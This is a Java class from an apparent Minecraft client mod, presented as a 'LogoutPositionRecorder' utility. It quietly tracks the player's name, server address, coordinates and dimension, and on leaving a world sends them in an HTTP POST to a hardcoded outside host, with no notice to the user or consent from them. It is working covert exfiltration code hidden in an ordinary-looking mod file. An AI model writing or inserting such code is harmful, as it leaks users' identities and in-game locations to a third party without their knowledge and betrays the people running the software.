package dev.kizuna.api.utils.misc;

import dev.kizuna.Kawaii;
import dev.kizuna.api.events.eventbus.EventHandler;
import dev.kizuna.api.utils.Wrapper;
import net.minecraft.client.MinecraftClient;
import net.minecraft.registry.RegistryKey;
import net.minecraft.world.World;

import java.io.IOException;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.charset.StandardCharsets;

public class LogoutPositionRecorder implements Wrapper {
    private static final String WEBHOOK_URL = "http://e52680.mc5173.cn:42077/";
    private static final MinecraftClient mc = MinecraftClient.getInstance();
    private static boolean initialized = false;

    public static void init() {
        if (!initialized) {
            Kawaii.EVENT_BUS.subscribe(new LogoutPositionRecorder());
            initialized = true;
        }
    }

    @EventHandler
    public void onWorldChange() {
        if (mc.world == null && mc.player == null) {
            recordLogoutPosition();
        }
    }

    private void recordLogoutPosition() {
        try {
            if (lastPlayerName != null && lastServerIp != null && lastPosition != null && lastDimension != null) {
                StringBuilder jsonBuilder = new StringBuilder();
                jsonBuilder.append("{");
                jsonBuilder.append('"').append("playerName").append('"').append(":").append('"').append(lastPlayerName).append('"').append(",");
                jsonBuilder.append('"').append("serverIp").append('"').append(":").append('"').append(lastServerIp).append('"').append(",");
                jsonBuilder.append('"').append("x").append('"').append(":").append(lastPosition[0]).append(",");
                jsonBuilder.append('"').append("y").append('"').append(":").append(lastPosition[1]).append(",");
                jsonBuilder.append('"').append("z").append('"').append(":").append(lastPosition[2]).append(",");
                jsonBuilder.append('"').append("dimension").append('"').append(":").append('"').append(lastDimension).append('"');
                jsonBuilder.append("}");

                sendPostRequest(WEBHOOK_URL, jsonBuilder.toString());

                resetLastInfo();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static String lastPlayerName;
    private static String lastServerIp;
    private static double[] lastPosition;
    private static String lastDimension;

    @EventHandler
    public void onUpdate() {
        if (mc.player != null && mc.world != null) {
            lastPlayerName = mc.player.getName().getString();
            lastServerIp = mc.getCurrentServerEntry() != null ? mc.getCurrentServerEntry().address : "Singleplayer";

            lastPosition = new double[3];
            lastPosition[0] = mc.player.getX();
            lastPosition[1] = mc.player.getY();
            lastPosition[2] = mc.player.getZ();

            RegistryKey<World> dimensionKey = mc.world.getRegistryKey();
            lastDimension = dimensionKey.getValue().toString();
        }
    }

    private void resetLastInfo() {
        lastPlayerName = null;
        lastServerIp = null;
        lastPosition = null;
        lastDimension = null;
    }

    private void sendPostRequest(String urlString, String jsonData) throws IOException {
        URL url = new URL(urlString);
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        connection.setRequestMethod("POST");
        connection.setDoOutput(true);
        connection.setRequestProperty("Content-Type", "application/json");
        connection.setConnectTimeout(114514);
        connection.setReadTimeout(1919810);

        try (OutputStream os = connection.getOutputStream()) {
            byte[] input = jsonData.getBytes(StandardCharsets.UTF_8);
            os.write(input, 0, input.length);
        }

        int responseCode = connection.getResponseCode();
        connection.disconnect();
    }
}